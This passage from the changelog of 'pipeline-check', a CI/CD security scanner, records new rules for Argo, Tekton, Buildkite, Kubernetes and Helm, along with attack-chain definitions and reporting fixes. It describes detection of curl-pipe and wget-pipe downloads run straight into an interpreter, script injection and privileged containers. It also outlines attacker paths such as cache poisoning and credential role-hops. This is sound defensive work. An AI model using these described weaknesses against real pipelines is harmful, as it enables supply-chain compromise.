  cdxgen / spdx-tools) (MEDIUM). ``ARGO-011`` fires when an
  artifact-producing Workflow emits no SLSA provenance
  attestation (``slsa-framework`` / ``cosign attest`` / ``in-
  toto`` / ``witness run``) (MEDIUM). ``ARGO-012`` fires when no
  vulnerability scanner runs across any Argo document (trivy /
  grype / snyk / npm-audit / pip-audit / osv-scanner / semgrep /
  checkov / tfsec) (MEDIUM). ``ARGO-013`` is the companion to
  ARGO-003 (default ServiceAccount): an explicit
  ``automountServiceAccountToken: false`` (workflow- or
  template-level) is required to remove the SA token from every
  step's pod. Templates that genuinely need K8s API access can
  opt in per-template; the rule fires only when neither spec
  nor template makes the choice explicit, leaving the cluster-
  default automount behavior in effect (MEDIUM). Provider
  catalog: 8 to 13 argo rules. 16 new per-rule tests in
  ``tests/argo/test_rules.py``; OWASP / NIST 800-53 / NIST 800-
  190 / SLSA / OpenSSF Scorecard / ESF / CIS supply chain
  mappings added; README + ``docs/index.md`` provider listings
  + argo.md regenerated; insecure / secure fixtures extended to
  exercise / pass every new rule.
- **Five new Tekton rules (`TKN-009`..`TKN-013`).** Closes the
  obvious posture gaps in the Tekton pack — it shipped at 8 rules
  while every CI provider averaged 30+. ``TKN-009`` fires when a
  Task / ClusterTask produces deployable artifacts (``docker
  build`` / ``docker push`` / ``buildah`` / ``kaniko`` / etc.)
  but invokes no signing tool (cosign / sigstore / slsa-framework
  / notation), reusing the shared signing-token catalog
  (MEDIUM). ``TKN-010`` fires when an artifact-producing Task
  has no SBOM step (syft / cyclonedx / cdxgen / spdx-tools)
  (MEDIUM). ``TKN-011`` fires when an artifact-producing Task
  emits no SLSA provenance attestation (``slsa-framework`` /
  ``cosign attest`` / ``in-toto`` / ``witness run``); Tekton
  Chains is the Tekton-native answer for cluster-side
  enforcement (MEDIUM). ``TKN-012`` fires when no vulnerability
  scanner runs across any Task / Pipeline / *Run document
  (trivy / grype / snyk / npm-audit / pip-audit / osv-scanner /
  semgrep / checkov / tfsec) (MEDIUM). ``TKN-013`` closes a real
  bypass: ``TKN-002`` already hardens ``spec.steps``, but
  ``spec.sidecars`` (which run alongside steps in the same pod)
  was uncovered, so a privileged ``docker:dind`` sidecar would
  cancel the protection of every hardened step in the same Task
  (HIGH; same precedence as TKN-002). TKN-009..011 scope to
  Task / ClusterTask kinds because PipelineRun / TaskRun would
  otherwise false-positive on a "deploy"-shaped reference name.
  Provider catalog: 8 to 13 tekton rules. 16 new per-rule tests
  in ``tests/tekton/test_rules.py``; OWASP / NIST 800-53 / NIST
  800-190 / SLSA / OpenSSF Scorecard / ESF / CIS supply chain
  mappings added; README + ``docs/index.md`` provider listings
  + tekton.md provider doc regenerated; insecure / secure
  fixtures extended to exercise / pass every new rule.
- **Five new Buildkite rules (`BK-009`..`BK-013`).** Closes the
  obvious posture gaps in the Buildkite pack — it shipped at 8
  rules while every other CI provider averaged 30+. ``BK-009``
  fires when a pipeline produces deployable artifacts but invokes
  no signing tool (cosign / sigstore / slsa-framework / notation),
  reusing the shared signing-token catalog (MEDIUM). ``BK-010``
  fires when an artifact-producing pipeline has no SBOM step
  (syft / cyclonedx / cdxgen / spdx-tools / sbom-tool), so post-
  incident CVE triage has nothing to match against (MEDIUM).
  ``BK-011`` fires when an artifact-producing pipeline emits no
  SLSA provenance attestation (``slsa-framework`` / ``cosign
  attest`` / ``in-toto`` / ``attest-build-provenance``), the SLSA
  L3 non-falsifiability requirement (MEDIUM). ``BK-012`` fires
  when no vuln scanner runs in the pipeline (trivy / grype /
  snyk / npm-audit / pip-audit / dependency-check / semgrep)
  (MEDIUM). ``BK-013`` fires when a deploy step has no
  ``branches:`` filter (or only a wildcard ``"*"``); a feature-
  branch PR could otherwise promote to prod by mistake. The
  pipeline-level ``branches:`` default counts (MEDIUM). Provider
  catalog: 8 to 13 buildkite rules. 16 new tests in
  ``tests/buildkite/test_rules.py``; OWASP / NIST 800-53 / SLSA /
  OpenSSF Scorecard / ESF / CIS supply chain mappings added;
  README + ``docs/index.md`` provider listings + buildkite.md
  provider doc regenerated; ``insecure-pipeline.yml`` /
  ``secure-pipeline.yml`` fixtures extended to exercise / pass
  every new rule.
- **Line-precision retrofit, sixth batch — five more rules.**
  ``ADO-002`` (Azure DevOps script injection via attacker-
  controllable context) anchors on the offending step, deduped
  per-step. ``K8S-006`` (container ``allowPrivilegeEscalation``
  not explicitly false) anchors on the ``securityContext``
  block, falling back to the container — same precedence as
  K8S-005. ``JF-002`` (Jenkins shell step interpolates
  attacker-controllable env var) emits one Location per offending
  ``sh`` / ``bat`` / ``powershell`` step using the offset that
  ``finditer`` recovers from the Jenkinsfile text. ``ARGO-002``
  (Argo template container runs privileged or as root) anchors
  on ``securityContext`` → container → template, plus
  ``spec.podSpecPatch`` when that's the offending leg. ``GHA-014``
  (GitHub Actions deploy job missing ``environment:`` binding)
  anchors on the offending job entry where the ``environment:``
  line goes. 38/363 to 43/363 line-precise. Five new entries in
  ``tests/test_line_precision.py``.
- **Line-precision retrofit, fifth batch — five more rules.**
  ``GHA-005`` (AWS long-lived credentials in env / step inputs)
  emits a Location at the offending step, env block, or
  ``aws configure set`` ``run:`` line — multiple Locations when
  several legs trip together. ``JF-009`` (Jenkins agent docker
  image not digest-pinned) re-scans the Jenkinsfile text via
  ``finditer`` to recover line offsets the bare ``findall``
  discards. ``DF-007`` (no HEALTHCHECK in final stage) anchors
  on the final ``FROM`` when no HEALTHCHECK is declared, or on
  the offending ``HEALTHCHECK NONE`` line when explicitly opted
  out. ``DF-013`` (EXPOSE on a remote-access port) emits one
  Location per offending EXPOSE. ``CC-009`` (deploy job
  without manual approval gate) anchors on the workflow's
  ``jobs[i]`` entry — that's where the ``requires:`` line goes.
  33/363 to 38/363 line-precise. Five new entries in
  ``tests/test_line_precision.py``.
- **`--explain CHECK_ID` now lists attack chains the rule
  triggers.** New ``[Triggers attack chains]`` section in the
  explain output cross-references the rule layer with the chain
  layer: when a rule's check_id appears in any
  ``ChainRule.triggering_check_ids`` tuple, the explain body lists
  the chain ID, title, and severity, with a hint to
  ``--explain AC-NNN`` for the full kill-chain narrative. Powered
  by a new ``triggering_check_ids: tuple[str, ...]`` field on
  ``ChainRule`` (defaulting to empty for backward compat) that
  every existing chain rule populates with its trigger set; the
  field replaces the implicit "look at what ``match()``
  hard-codes" coupling between the metadata and the matcher.
  ``test_every_chain_declares_triggering_check_ids`` regression-
  tests every chain has the field set, so a future chain that
  ships without it trips at CI time. ``--explain GHA-001`` now
  shows ``AC-003 / AC-009 / AC-018`` under the new section, and
  every other rule that participates in a chain gets the same
  treatment automatically.
- **Two cross-provider attack chains (`AC-018` / `AC-019`).**
  ``AC-018`` "Unpinned action lands on deploy job with no
  environment gate" fires when ``GHA-001`` (action pinned by tag /
  branch rather than commit SHA) and ``GHA-014`` (deploy job
  missing ``environment:`` binding) co-occur on the same workflow
  — the supply-chain leg lets a compromised upstream maintainer
  re-tag a malicious release, and the deploy-stage leg ships it
  to production without a required-reviewer pause. Severity
  CRITICAL. MITRE T1195.002 + T1098.003 + T1556. Mirrors the
  AC-009 ``group_by_resource`` shape so the chain only triggers
  when both legs land on the *same* workflow file. ``AC-019``
  "Lambda env-secret meets a CI/CD role with PassRole *" fires
  when ``LMB-003`` (Lambda env carrying a credential-shaped
  literal) and ``IAM-004`` (CI/CD role with ``iam:PassRole`` on
  ``Resource: '*'``) both trip in the same scan. The first leg is
  a credential leak readable to anyone with
  ``lambda:GetFunctionConfiguration`` (a much wider audience than
  the principal that can invoke the function); the second turns
  the leaked credential into a role-hop primitive against any IAM
  role in the account. Severity CRITICAL. MITRE T1552.001 +
  T1098.003 + T1078.004. Catalog: 17 chains to 19. 12 new tests
  in ``tests/test_attack_chains.py``; ``docs/attack_chains.md``
  regenerated; README headline 17 to 19 chains.
- **Line-precision retrofit, fourth batch — five more rules.**
  ``GHA-013`` (issue_comment trigger without author guard) — anchors
  on the workflow's ``on:`` block. ``K8S-026`` (LoadBalancer Service
  without ``loadBalancerSourceRanges``) — anchors on the Service
  ``spec`` block where the missing source-range list belongs.
  ``DF-005`` (RUN body uses dangerous shell-eval idioms) — one
  Location per offending RUN line, mirrors the DF-004 / DF-008
  shape. ``CC-002`` (CircleCI script injection via untrusted env
  vars) — anchors on the offending job, deduped per-job so a job
  with multiple unsafe ``run:`` commands gets one Location not
  many. ``BB-002`` (Bitbucket script injection via attacker-
  controllable context) — anchors on the offending step.
  28/363 -> 33/363 line-precise. Five new entries in
  ``tests/test_line_precision.py``.
- **Four new Cloud Build rules (`GCB-023`..`GCB-026`).** Round
  out the cloudbuild pack with build-correctness and
  audit/discoverability checks. ``GCB-023`` flags steps that
  reference ``$_USER_VAR`` not declared in ``substitutions:`` —
  with the strict ``MUST_MATCH`` default the build fails at
  parse, but combined with ``ALLOW_LOOSE`` (GCB-022) the typo'd
  ref silently expands to empty (MEDIUM). ``GCB-024`` flags
  builds that push Docker images via an explicit ``docker push``
  step but don't declare the resulting image in the top-level
  ``images:`` array — Cloud Build's image-attestation layer only
  tracks images declared there (LOW). ``GCB-025`` flags builds
  with an empty ``tags:`` field — tags drive Cloud Logging
  filtering and post-incident discovery (LOW). ``GCB-026`` flags
  step ``waitFor:`` references that don't match any declared
  step ``id:`` — Cloud Build silently treats dangling references
  as no-wait, so dependency ordering becomes ineffective without
  warning (MEDIUM). Provider catalog: 22 to 26 cloudbuild rules.
  23 new tests in ``tests/test_gcb_rules_023_026.py``; OWASP +
  NIST 800-53 mappings added; README + ``docs/index.md`` provider
  listings + cloudbuild.md provider doc regenerated;
  insecure-cloudbuild.yaml fixture extended with examples that
  trigger every new rule (and ``images:`` array removed so
  GCB-024 fires); secure-cloudbuild.yaml gains a ``tags:``
  declaration so GCB-025 passes.
- **Four new HELM-native rules (`HELM-007`..`HELM-010`).** Round
  out the chart-supply-chain pack with chart-listing hygiene and
  freshness signals. ``HELM-007`` fires when ``Chart.yaml``'s
  ``description:`` field is missing or blank — chart registries
  display this as the listing summary, and an anonymous chart in
  a shared registry is the same trust gap as a missing
  ``maintainers`` entry (LOW). ``HELM-008`` fires when
  ``Chart.lock``'s ``generated:`` timestamp is more than 90 days
  old — pinned-but-unrefreshed locks mean CVE fixes and
  deprecation notices from the last quarter haven't been
  considered (MEDIUM; threshold matches the CIS / NIST 90-day
  rotation cadence). ``HELM-009`` fires when ``home:`` /
  ``sources:`` URLs use a non-HTTPS scheme — plaintext landing
  pages are man-in-the-middleable for anyone evaluating the
  chart's provenance from a public registry; mirrors HELM-003's
  stance for dependency repos (LOW). ``HELM-010`` fires when
  ``appVersion`` is empty on an application chart — without it,
  CVE tracking against the upstream application has no anchor;
  library charts (``type: library``) are exempted (LOW). Provider
  catalog: 6 to 10 helm-native rules. 24 new tests in
  ``tests/helm/test_helm_chart_rules.py``; HELM-008's clock
  comparator accepts an injected ``_now`` so tests don't depend
  on wall-clock time. Standards mappings (OWASP, NIST 800-53)
  added; README + helm.md provider doc updated.
- **Five new K8s posture rules (`K8S-031`..`K8S-035`).** Closes
  common posture gaps not yet covered by the original 30 rules.
  ``K8S-031`` PSA ``warn`` label missing — companion to K8S-023's
  ``enforce`` check; without ``warn`` an enforcement upgrade
  lands as a surprise (LOW). ``K8S-032`` namespace lacks a
  default-deny ``NetworkPolicy`` (cross-doc correlation: walks
  Namespace + workload + NetworkPolicy across the manifest set;
  fires when a namespace has workloads but no
  ``podSelector: {}`` policy) (MEDIUM). ``K8S-033`` namespace
  lacks ``ResourceQuota`` / ``LimitRange`` (cross-doc; quota caps
  the aggregate, limit-range caps the per-pod baseline) (MEDIUM).
  ``K8S-034`` ServiceAccount with ``automountServiceAccountToken``
  not explicitly ``false`` — pod-level K8S-012 covers the
  consumer side; this rule covers the SA side (MEDIUM).
  ``K8S-035`` container with explicit ``runAsUser: 0`` — pairs
  with K8S-007's ``runAsNonRoot: false`` so neither shape slips
  through alone (HIGH). Provider catalog: 30 to 35 K8s rules.
  Also bumps the headline check count claim ``450+`` to ``500+``
  in README + docs/index.md, and the Helm provider's "K8S-* rule
  pack" reference from 30 to 35 (since helm renders into K8s
  manifests). 31 new tests in
  ``tests/kubernetes/test_k8s031_035_posture_gaps.py`` cover
  per-rule positive / negative cases plus orchestrator wiring;
  ``tests/test_workflow_fixtures.py`` and
  ``tests/test_rule_framework.py`` updated to reflect the new
  count, and ``tests/fixtures/workflows/k8s/insecure.yaml`` /
  ``secure.yaml`` extended with examples that exercise / pass the
  new rules.
- **Line-precision retrofit, third batch — five more rules.**
  ``GHA-017`` (docker run with insecure flags) — restructured the
  blob-scan to also walk steps and rescan each step's ``run:``
  body so the matching step's source line is the anchor. The
  workflow-level blob fallback stays for catches in ``env:`` /
  ``container.options:``. ``DF-008`` (RUN invokes
  docker --privileged / dangerous --cap-add) — one Location per
  offending RUN. ``K8S-021`` (Role/ClusterRole grants wildcard
  verbs on wildcard resources) — anchors on the offending rules
  entry, not the manifest root. ``CC-016`` and ``GL-016``
  (curl-pipe / wget-pipe to interpreter) — same pattern as
  GHA-017: keep the document-level blob scan as the legacy
  detection surface, add a per-job rescan that recovers the
  offending job's source line. 23/363 to 28/363 line-precise.
  Five new entries in ``tests/test_line_precision.py``.
- **CIS AWS Foundations Benchmark backfill across the AWS rule
  pack.** AWS-pack CIS coverage was 22/71 (31%); the rest of the
  AWS rules fit cleanly into the existing CIS controls
  (encryption-at-rest extensions to ``3.7``, CMK rotation
  ``3.8``, over-broad principals ``1.16``, credential rotation
  ``1.14``) and were never wired up. Added 18 new mappings —
  CodeArtifact / CodeCommit / CodePipeline / ECR / Lambda / SSM /
  Secrets Manager / IAM trust-policy gaps. AWS-pack CIS coverage
  now 40/71 (56%); catalog-wide CIS Foundations coverage 6% to
  11%. Service-specific CI/CD rules (build timeouts, lifecycle
  policies, signer profiles) are intentionally left unmapped to
  preserve the standard's "subset covering CI/CD-relevant
  controls" framing — CIS Foundations doesn't enumerate them, and
  forcing them in would mis-cite the benchmark. Added
  ``cis_aws_foundations`` to ``TestPerFrameworkCoverageFloor``
  with a 10% floor, so a future drop trips at CI time.
- **Two cross-provider attack chains (`AC-016` / `AC-017`).**
  ``AC-016`` "OIDC role drift" fires when ``GHA-030`` (job uses
  OIDC ``id-token: write`` without an ``environment:`` gate) and
  ``IAM-002`` (CI/CD role has wildcard ``Action`` in attached
  policy) both trip in the same scan — the GitHub side leaves the
  token-mint ungated against fork PRs, the AWS side gives the
  assumed role unbounded authority, and the OIDC pattern's
  short-lived-key promise loses its tight-scope half. MITRE
  T1078.004 + T1556. ``AC-017`` "Build cache poisoning to mutable
  ECR tag" fires when ``GHA-011`` (cache key derived from
  attacker-controllable input) and ``ECR-002`` (image tag
  mutability not enforced) both trip — a fork-PR-driven cache
  poisoning lands on the next default-branch build, which pushes
  to a mutable tag every consumer pulls by name. MITRE T1195.001
  + T1546. Catalog: 15 chains to 17.
- **`docs_note` backfill across the AWS rule pack.** 58 of 363
  rules — every AWS-pack rule across CA / CB / CCM / CD / CP / CT
  / CW / CWL / EB / ECR / IAM / KMS / LMB / PBAC / S3 / SIGN / SM /
  SSM — shipped with empty ``docs_note``, a migration artifact
  from the class-based-to-rule-based refactor. ``--explain
  IAM-001`` (and every other AWS ID) rendered the header +
  standards mappings + recommendation but no [What it checks]
  body, leaving operators without the threat-model framing other
  packs always provided. Each is now backfilled with 2-4 sentences
  explaining the underlying threat model — distinct from the
  recommendation's how-to-fix. A new
  ``TestEveryRuleHasDocsNote`` regression test in
  ``tests/test_standards.py`` walks every rule across every pack
  and asserts a non-empty ``docs_note`` field, so a future rule
  that lands without one trips at CI time.
- **Line-precision retrofit for eleven high-fire rules.** v0.4.0
  introduced ``Finding.locations`` with structured ``start_line`` /
  ``end_line``, but only 12 rules were retrofitted in that release.
  Two batches landed in this cycle, bringing the total to 23. First
  batch: ``K8S-005`` (privileged container — anchors on the
  ``securityContext`` block), ``K8S-013`` (hostPath volume — anchors
  on the ``hostPath:`` mapping), ``DF-002`` (no USER — anchors on
  the final stage's ``FROM`` line, or the explicit ``USER root``
  directive when present), ``DF-004`` (curl-pipe in RUN — anchors
  on the offending RUN line), and ``GHA-002`` (pull_request_target
  + PR head checkout — anchors on the offending step). Second batch:
  ``K8S-018`` (Secret with literal credential-shaped data — anchors
  on the ``stringData`` / ``data`` block), ``K8S-020`` (cluster-admin
  binding — anchors on the ``roleRef`` block), ``DF-006`` (ENV/ARG
  carrying a credential-shaped literal — one Location per offending
  directive), ``GHA-003`` (script injection via untrusted context —
  step-level), ``GL-002`` (script injection via untrusted CI vars —
  job-level), and ``JF-001`` (unpinned ``@Library`` reference —
  re-scans Jenkinsfile text via ``finditer`` to recover line offsets
  the bare-string ``Jenkinsfile.library_refs`` field discards).
  Reporters / SARIF / PR-comment action all switch to the precise
  ``path:line`` automatically; the regex best-effort fallback no
  longer kicks in for these IDs. Eleven new entries in
  ``tests/test_line_precision.py`` lock the precision against
  future loader regressions.
- **Supply-chain framework backfill across new rule packs.** Argo /
  Buildkite / Tekton / Helm rules previously had only OWASP
  CICD-Top-10 coverage; the four supply-chain frameworks (SLSA
  Build track, OpenSSF Scorecard, CIS Software Supply Chain Guide,
  NSA/CISA ESF) now carry the same per-rule mappings the older CI
  packs already had. NIST 800-53 also picked up the 24 non-Helm
  rules (Helm got 800-53 in the previous round). Net effect on
  catalog-wide coverage: ESF 55% to 63%, OpenSSF 54% to 61%, NIST
  800-53 51% to 58%, SLSA 36% to 44%, CIS supply chain 22% to 30%.
  A new ``TestPerFrameworkCoverageFloor`` test asserts each
  framework's coverage stays at or above the documented floor;
  future rule packs that ship without the matching framework
  mappings trip it at CI time.
- **OWASP-coverage backfill across every rule pack.** 36 rules
  shipped with a populated ``Rule.owasp`` tuple but no entry in
  ``pipeline_check/core/standards/data/owasp_cicd_top_10.py`` —
  every Argo / Buildkite / Tekton rule, plus several late-added
  GitHub / GitLab / Bitbucket / Azure / Jenkins / CircleCI rules.
  ``resolve_for_check()`` returned no controls for these IDs even
  though the rule "knew" the right CICD-SEC tags. All 36 are now
  in the data file. A second pass caught and merged 13 rules whose
  data-file mapping was a strict subset of the rule's declared
  tags (e.g. ``DF-016`` ``CICD-SEC-3+9+10`` instead of just
  ``CICD-SEC-9``). Two new regression tests in
  ``tests/test_standards.py`` walk every rule on disk and assert
  (a) the ID is in the OWASP data file, (b) every tag the rule
  declares is also in the data file. A future contributor adding a
  rule without backfilling either trips at CI time.
- **HELM rules densified to NIST 800-190 + NIST 800-53 mappings.**
  The original HELM-001..006 release shipped with OWASP coverage
  only. Added applicable NIST 800-190 controls (4.1.5 untrusted
  images, 4.2.1 insecure registry connections — the chart-distribution
  analogs) and NIST 800-53 controls (SR-3 supply chain, SR-11
  component authenticity, SI-7 software integrity, SC-8 transmission
  integrity, CM-2 baseline configuration). Each HELM rule now has
  2–3 standards covering it instead of one, matching the K8S-001 /
  DF-001 mapping density.
- **AC-015 attack chain — Helm chart-supply-chain takeover.**
  Fires when the same scan turns up failing HELM-001 (legacy
  ``apiVersion: v1``), HELM-002 (missing ``Chart.lock`` digests),
  *and* HELM-003 (non-HTTPS dependency repository). Each leg is a
  HIGH or MEDIUM finding on its own; the combination removes every
  layer of supply-chain defense at once — no schema lock, no digest
  verification, no TLS — and lets an on-path attacker substitute a
  dependency tarball during ``helm dependency build`` without any
  rendered-manifest signal that the swap occurred. Mirrors AC-009
  (GHA repo poisoning) and AC-011 (K8s cluster takeover) in shape;
  MITRE ATT&CK mapping picks up T1195.002 (supply chain compromise)
  and T1557 (adversary-in-the-middle). Catalog: 14 chains to 15.
- **Helm chart-supply-chain rules expanded to six (`HELM-004` /
  `HELM-005` / `HELM-006`).** Builds on the HELM-001/002/003 trio
  that just landed. `HELM-004` flags `dependencies[].version`
  values that aren't exact SemVer pins (ranges, wildcards,
  `||`-alternations) — those let `helm dependency update` move
  consumers to a new dep on the next refresh even when the lock
  looked stable (MEDIUM). `HELM-005` flags charts whose
  `maintainers:` field is missing, empty, or carries entries
  without a usable `name + email|url` chain-of-custody record
  (LOW). `HELM-006` flags charts that ship no `kubeVersion`
  compatibility range — the only static guard against rendering
  against a cluster whose API surface dropped something the chart
  still uses (LOW). Provider catalog: 3 native to 6 native.
- **Three new comment-only autofixers (`HELM-001` / `HELM-002` /
  `HELM-003`).** Each drops a ``# TODO(pipeline-check HELM-NNN):``
  marker above the offending Chart.yaml line so the change is
  visible in review. Same comment-only shape used for the K8s and
  Dockerfile rules where text-rewriting can't safely synthesize
  the structural fix (`helm dependency update` needs to fetch and
  hash; an `http://` flip needs the maintainer to confirm the dep
  is published over HTTPS first). Autofixer count: 100 to 103.
- **Helm-native rules (`HELM-001` / `HELM-002` / `HELM-003`).** The
  Helm provider now scores the chart's own packaging metadata
  alongside the rendered K8s manifests. `HELM-001` flags the legacy
  `apiVersion: v1` chart format (MEDIUM); `HELM-002` flags a `v2`
  chart that declares `dependencies:` but ships no `Chart.lock`,
  ships a lock missing entries, or ships entries without a
  `sha256:` digest (HIGH); `HELM-003` flags
  `dependencies[].repository` values on non-HTTPS schemes (HIGH;
  `https://`, `oci://`, `file://`, and local `@alias` repos pass).
  Implementation: a new ``parse_chart()`` reads ``Chart.yaml`` /
  ``Chart.lock`` from each chart directory (or ``.tgz``) and
  attaches a ``Chart`` record per chart to ``HelmContext.charts``;
  a new ``HelmChartChecks`` orchestrator runs the rules against
  that view. The K8s rule pack still iterates ``ctx.manifests``
  unchanged, so the two passes coexist without overlap. Provider
  catalog: 0 native to 3 native.

### Changed

- **Every ``@dataclass`` now uses ``slots=True``.** All 45
  dataclass declarations under ``pipeline_check/`` were converted
  in one sweep — high-fan-out hot types (``Finding``, ``Location``,
  ``Manifest``, ``Chain``, ``Component``, ``Instruction``,
  ``Chart``, ``UsesRef``, ``ControlRef``) and the lower-volume
  context / config types (``DockerfileContext``, ``HelmContext``'s
  inputs, ``ScanMetadata``, gate ``GateOutcome``, etc.). ``slots``
  removes the per-instance ``__dict__`` allocation and replaces
  attribute lookup with a fixed offset descriptor, which matters
  on a real scan where ``Finding`` is instantiated 10k+ times. No
  behavior change; ``frozen=True`` is preserved where it was set;
  ``field(default_factory=...)`` defaults still work; the public
  ``Finding`` / ``Location`` / ``Chain`` / ``ControlRef`` API
  surface (constructors, ``to_dict``, attribute reads) is
  unchanged. Verified by running the full 3791-test suite plus
  strict mypy across all 573 source files; no regressions.

### Changed

- **Em-dash sweep across the docs surface.** CLAUDE.md asks
  contributors to avoid em-dashes (``—``) as dramatic pauses and
  use periods, commas, parentheses, or colons instead. The
  convention had drifted, and the project carried over 3500
  em-dashes across docs, README, source rule modules, and
  generator templates. This sweep clears the docs surface
  (``docs/``, README, all auto-generated provider docs, all 25
  attack-chain reference cards) plus the source rule modules and
  chain modules that drive the generated docs, plus the generator
  scripts themselves. Heuristic: capital-letter follower → period,
  pronoun follower (it / this / they / etc.) → period +
  capitalize, lowercase follower → comma; list-bullet, heading,
  YAML-frontmatter, and HTML-attribute em-dashes all become
  colons; end-of-line wrapped em-dashes get the same treatment
  using lookahead at the next line. Manual prose fixes for places
  where mechanical replacement broke parenthetical-list grammar
  (AC-021 / AC-022 / AC-024 / AC-025 narratives, a few helm rule
  doc-notes). Also bumped both generator scripts'
  ``## RULE-ID`` / ``### AC-NNN`` heading templates from
  ``RULE-ID — title`` to ``RULE-ID: title`` so future regenerated
  docs stay consistent. Out of scope (deliberately): ``autofix.py``
  TODO markers (those ship into customer YAML / Dockerfile / Helm
  files, separate UX call), ``CHANGELOG.md`` historical sections
  (frozen prose), test-fixture narrative assertions (separate
  scope, would create churn without user-visible benefit).
  ~3450 sites cleaned across ~600 files; the remaining ~95 are
  the explicitly out-of-scope surfaces listed above. Verified: zero
  em-dashes in ``docs/``, README, scripts/, source rule modules
  under ``pipeline_check/core/checks/*/rules/``, chain modules
  under ``pipeline_check/core/chains/rules/``, and shared
  ``_primitives``. 3964 tests passing.

### Fixed

- **Doc-accuracy fixes from a documentation review.** Three
  numerical / structural drifts and one broken link, all
  user-visible:
  (1) `README.md` ASCII tree showed the kubernetes pack as
  `K8S-001 .. K8S-035` while the table on the same page (and the
  registry) had grown to `K8S-001 .. K8S-040`; the tree was
  stale across the K8S-027 / -030 / -035 / -040 expansion waves.
  Bumped to 040.
  (2) `docs/index.md:25` lede claimed "graded against 13
  compliance frameworks"; current count is 14 (CIS Kubernetes
  Benchmark v1.10 was added in the previous wave).
  `tests/test_doc_claims.py` happens not to lock this exact
  string format so the drift wasn't caught by the existing
  guard. README:13 already said "14".
  (3) `docs/writing_a_provider.md:184` told future contributors
  that `README.md` and `docs/index.md` carry claims of "`16
  providers`, `13 standards`". The literal "13" would have
  copied forward into the next provider's PR description.
  Rephrased to be format-agnostic so the contributor doc can't
  rot the same way.
  (4) `README.md:415` had a broken link `[docs/lambda.md](docs/)`
  for the Lambda deployment section; the file `docs/lambda.md`
  does not exist and the link target is the directory itself.
  The actual canonical Lambda docs are inside
  `pipeline_check --man lambda` (verified comprehensive: build
  steps, env vars, IAM permissions, event payload shapes, SNS
  alerting). Replaced the broken link with a pointer to the
  `--man` topic.
- **Rebrand: removed leaked `pipelineguard` codename from autofix
  output, docs, and tests.** The published name has always been
  `pipeline-check` (per `pyproject.toml`), but 91 instances of an
  earlier codename had leaked through: 37 sites in
  `pipeline_check/core/autofix.py` were stamping
  ``# TODO(pipelineguard): ...`` markers into customer YAML /
  Dockerfile / Helm chart files every time `--autofix` ran, 53
  test-assertion sites in `test_autofix.py` / `test_bug_fixes.py`
  were locking the wrong string (so the test suite was structurally
  enforcing the bug), 1 site in `pipeline_check/core/manual.py`
  showed up in `--man autofix` output, and 2 sites in
  `docs/ci_gate.md` documented an `.pipelineguard-ignore.yml`
  filename example that the loader never accepted (the actual
  default is `.pipelinecheckignore`, with optional YAML form
  `.pipeline-check-ignore.yml`). Also corrected
  `docs/providers/aws.md` IAM-policy snippet from
  `PipelineGuardReadOnlyScan` / `pipeline-guard-readonly.json` to
  `PipelineCheckReadOnlyScan` / `pipeline-check-readonly.json`,
  fixed `scripts/build_lambda.sh` (header comment, output zip
  filename, build-output echo), and added a regression guard
  (`tests/test_brand_leak.py`) that scans every tracked
  `.py` / `.md` / `.yml` / `.yaml` / `.toml` / `.sh` for the
  forbidden token (case-insensitive) and fails CI if it ever
  drifts back. Verified end-to-end: a synthetic GHA-008 fixture
  through `generate_fix` now emits
  `# TODO(pipeline-check): rotate and wire up a secret`, and
  `pipeline_check --man autofix` reads the same.
- **SARIF fingerprint stability for AWS-resource findings on
  Windows.** ``_finding_fingerprints`` previously routed every
  ``f.resource`` value through ``_normalize_path``, which
  lowercases on Windows because the local filesystem is case-
  insensitive. AWS findings carry ARNs / IAM role names in
  ``f.resource`` (no ``Location``), and ARN case is meaningful
  ("``us-east-1``" vs "``US-EAST-1``"), so a Windows-hosted scan
  hashed those resources to a different fingerprint than the same
  AWS account scanned on Linux. GHCS dedup broke whenever a
  customer alternated the runner OS. The reporter now normalizes
  only when the finding has a file-backed primary ``Location``;
  resource-only findings hash ``f.resource`` raw. New regression
  test ``test_arn_fingerprint_is_cross_platform_stable`` patches
  ``os.name`` and asserts the same ARN produces the same
  fingerprint on either platform.
- **AC-021 narrative no longer says "TaskRun".** The AC-021
  ("Argo default-SA workflow lands on a default-SA RoleBinding")
  prose was using Tekton terminology, TaskRun is a Tekton CRD,
  not an Argo concept. Replaced with "workflow pod", which is
  what an Argo Workflow / WorkflowTemplate actually spawns. Pure
  prose change; the chain match logic and severity were unaffected.
- **AC-020 / AC-021 attack-chain table now links the per-rule
  anchors.** ``docs/attack_chains.md`` rendered ``TKN-004`` and
  ``ARGO-003`` as plain code spans for the two newest chains
  while every prior row linked through to the rule's section in
  the provider doc. Now consistent with AC-001..AC-019.
- **`ControlRef` re-export now explicit in ``checks.base``.**
  ``pipeline_check.__init__`` re-exports ``ControlRef`` from
  ``pipeline_check.core.checks.base``, but the latter only had it
  imported (for use as a type annotation) without naming it in
  ``__all__``. Strict mypy under ``--no-implicit-reexport`` flagged
  the public re-export as ``not explicitly exported``. Adding it to
  ``__all__`` keeps the public import path stable without a code-
  side migration.
- **Reporter output gaps caught by a release-readiness audit.**
  JUnit ``<testcase>`` elements now carry the ``time="0"``
  attribute that JUnit-4 / Surefire schemas require — some CI
  ingestors (Jenkins JUnit plugin, surefire-report) reject
  testcase elements without it. The Markdown reporter's row-
  escape helper now backslash-escapes backticks alongside pipes
  / newlines / backslashes; a finding whose title carries a
  backtick (``Missing `var.tf` check``) no longer corrupts the
  table by opening an unbalanced inline-code span. CHANGELOG's
  ``[Unreleased]`` section had two ``### Added`` sub-headings
  (Keep-a-Changelog requires one per type); merged.
- **GHA resolver hardened against path-traversal + DoS.**
  ``DiskFetcher`` (``--gha-search-path`` consumer) now validates
  each ``owner`` / ``repo`` / ``path`` component for ``..``
  segments and confirms the resolved candidate is a descendant
  of the configured search root before reading. ``HttpFetcher``
  (``--resolve-remote`` consumer) now caps response bodies at
  10 MiB, so a malicious / misrouted remote can't balloon scanner
  memory with an attacker-controlled response stream. Both
  fetchers are still opt-in via ``--resolve-remote`` /
  ``--gha-search-path``; the hardening makes the opt-in safer.
- **Hot-path regex compilation removed from per-step inner
  loops.** ``has_unsafe_reference`` (used by every CI provider's
  script-injection rule) now caches compiled patterns through
  ``functools.lru_cache``. ``GHA-033``'s
  ``_scan_for_printed_secret`` compiles each secret-env-var's
  reference pattern once per call rather than once per
  ``(segment × name)`` pair. Measurable on 500-job workflows
  where each step's run-block was triggering thousands of
  redundant ``re.compile`` calls.
- **Dropped unused ``flake8`` dev dependency.**
  ``requirements-dev.in`` declared ``flake8>=7.0`` but nothing
  imports or invokes it — ruff replaced it months ago. Removed
